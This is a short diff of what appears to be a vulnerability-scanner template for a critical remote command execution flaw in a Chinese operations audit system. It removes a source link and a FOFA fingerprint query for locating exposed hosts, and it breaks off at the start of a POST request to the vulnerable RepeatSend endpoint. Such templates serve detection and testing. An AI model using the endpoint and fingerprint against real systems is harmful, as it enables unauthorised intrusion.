@@ -3,12 +3,8 @@ info:
   name: 上讯信息运维管理审计系统 repeatsend 远程命令执行
   author: hacktwo
   severity: critical
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/pmt8ibil1nps6sbe'
+  description: ''
   tags: rce,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: pmt8ibil1nps6sbe
-    fofa: body="default/getloginhtml"
 http:
 - raw:
   - 'POST /emailapply/RepeatSend HTTP/1.1
